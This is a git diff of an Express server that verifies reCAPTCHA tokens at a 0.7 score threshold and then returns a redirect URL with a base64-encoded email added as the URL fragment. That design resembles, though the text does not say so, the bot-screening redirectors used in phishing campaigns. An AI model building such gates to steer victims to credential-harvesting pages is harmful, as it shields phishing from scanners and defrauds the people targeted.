@@ -8,135 +8,115 @@ import { setDefaultResultOrder } from 'dns';
 // =====================
 // CRITICAL RAILWAY FIXES
 // =====================
-setDefaultResultOrder('ipv4first'); // Force IPv4 connections only
+setDefaultResultOrder('ipv4first');
 
-// =====================
-// APP CONFIGURATION
-// =====================
 const app = express();
 const PORT = process.env.PORT || 8080;
 
 // =====================
-// ENHANCED MIDDLEWARE
+// MIDDLEWARE
 // =====================
-app.set('trust proxy', 1); // Trust Railway's proxy
+app.set('trust proxy', 1);
 app.use(cors({
   origin: process.env.FRONTEND_URL || '*',
   credentials: true
 }));
 app.use(express.json());
-app.use(morgan('combined')); // Production logging
+app.use(morgan('combined'));
 
-// Rate limiting with better headers
 app.use(rateLimit({
-  windowMs: 60 * 1000, // 1 minute
+  windowMs: 60 * 1000,
   max: 100,
   standardHeaders: true,
   legacyHeaders: false
 }));
 
 // =====================
-// RELIABILITY IMPROVEMENTS
+// ROUTES
 // =====================
-
-// Enhanced health check (Railway requires this)
 app.get('/health', (req, res) => {
   res.status(200).json({
     status: 'ready',
     timestamp: new Date().toISOString(),
-    ipMode: 'ipv4-only', // Confirm IPv4 enforcement
-    services: {
-      recaptcha: !!process.env.RECAPTCHA_SECRET,
-      database: false // Add if you add a DB later
-    }
+    ipMode: 'ipv4-only'
   });
 });
 
-// reCAPTCHA Verification (With Connection Timeout Fix)
 app.post('/verify-token', async (req, res) => {
-  const { token, email } = req.body;
+  const { token, email } = req.body; // email is base64-encoded
   const secret = process.env.RECAPTCHA_SECRET;
 
   // Validate token format
   if (typeof token !== 'string' || token.length < 10) {
-    return res.status(400).json({
-      success: false,
-      error: 'Invalid token format'
-    });
+    return res.status(400).json({ success: false, error: 'Invalid token format' });
   }
 
   if (!secret) {
-    console.error('❌ RECAPTCHA_SECRET missing');
-    return res.status(500).json({
-      success: false,
-      error: 'Server configuration error'
-    });
+    return res.status(500).json({ success: false, error: 'Server configuration error' });
   }
 
   try {
-    // Verify with Google (with timeout)
+    // Verify with Google
     const response = await axios.post(
       'https://www.google.com/recaptcha/api/siteverify',
       new URLSearchParams({ secret, response: token }),
-      {
+      { 
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        timeout: 2500 // 2.5 second timeout
+        timeout: 2500 
       }
     );
 
     const { success, score, 'error-codes': errors = [] } = response.data;
 
-    if (!success || score < 0.5) {
+    // Strict score validation (NEW: 0.7 threshold)
+    if (!success) {
       return res.status(403).json({
         success: false,
-        reason: success ? 'Low score' : 'Verification failed',
-        score,
+        reason: 'reCAPTCHA verification failed',
         errors
       });
     }
 
-    // Build redirect URL with email if provided
-    let redirectUrl = process.env.REDIRECT_URL || 'https://default-redirect.com';
-    if (email) {
-      redirectUrl = `${redirectUrl.replace(/\/$/, '')}/${encodeURIComponent(email)}`;
+    if (score < 0.7) { // Reject scores below 0.7
+      return res.status(403).json({
+        success: false,
+        reason: 'Low reCAPTCHA score (minimum: 0.7)',
+        score,
+        requiredScore: 0.7
+      });
     }
 
-    return res.json({
+    // Build redirect URL with base64 email (unchanged)
+    let redirectUrl = process.env.REDIRECT_URL || 'https://default-redirect.com';
+    if (email) {
+      redirectUrl = `${redirectUrl.replace(/#.*$/, '')}#${email}`;
+    }
+
+    return res.json({ 
       success: true,
       redirect: redirectUrl,
-      score
+      score // Optional: Return score to client
     });
 
   } catch (err) {
-    console.error('reCAPTCHA API Error:', {
-      message: err.message,
-      code: err.code,
-      timeout: err.code === 'ECONNABORTED'
-    });
-
-    return res.status(502).json({
-      success: false,
+    console.error('reCAPTCHA API Error:', err.message);
+    return res.status(502).json({ 
+      success: false, 
       error: 'Verification service unavailable',
-      retry: true
+      retry: true 
     });
   }
 });
 
 // =====================
-// SERVER STARTUP (CRITICAL FOR RAILWAY)
+// SERVER START
 // =====================
 const server = app.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 Server running on http://0.0.0.0:${PORT}`);
-  console.log('Active Configuration:', {
-    nodeEnv: process.env.NODE_ENV,
-    recaptchaReady: !!process.env.RECAPTCHA_SECRET,
-    ipMode: 'ipv4-only'
-  });
 });
 
-// Railway-specific optimizations
-server.keepAliveTimeout = 60000; // 60s
-server.headersTimeout = 65000; // 65s
+server.keepAliveTimeout = 60000;
+server.headersTimeout = 65000;
 
 // Graceful shutdown
 process.on('SIGTERM', () => {
